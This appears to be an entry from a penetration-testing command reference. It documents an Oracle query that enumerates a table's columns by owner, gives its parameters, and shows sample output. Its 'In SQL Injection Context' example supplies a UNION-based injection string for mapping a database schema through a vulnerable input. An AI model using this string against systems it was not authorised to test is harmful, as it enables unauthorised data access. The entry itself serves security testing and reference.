---
type: command
executor: sql
data: >-
  SELECT column_name FROM all_tab_columns WHERE table_name = '$_TABLE_NAME' AND
  owner = '$_OWNER_NAME';
tags:
  - oracle
  - sqli
  - enumeration
platforms:
  - Database
  - Oracle
verified: true
validated: true
---

# oracle-sql-enumerate-columns-by-table-and-owner

## Command

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = '$_TABLE_NAME' AND owner = '$_OWNER_NAME';
```

## Description

This SQL command retrieves column names from the ALL_TAB_COLUMNS view for a specific table owned by a given schema user in Oracle. It filters results to the exact owner, useful in environments with multiple schemas.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TABLE_NAME | The name of the target table (uppercase) | Yes |
| $_OWNER_NAME | The schema owner of the table | Yes |

## Examples

### Basic Usage

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'EMPLOYEES' AND owner = 'HR';
```

### In SQL Injection Context

Inject as: `' UNION SELECT column_name FROM all_tab_columns WHERE table_name = 'EMPLOYEES' AND owner = 'HR' --`

## Expected Output

Owner-specific column list:

COLUMN_NAME
------------
ID
NAME
SALARY
DEPARTMENT_ID

Empty if no matching table/owner.

## Related

- [[procedures/Oracle-SQL-Column-Enumeration]]
- [[commands/oracle-sql-enumerate-columns-by-table]]
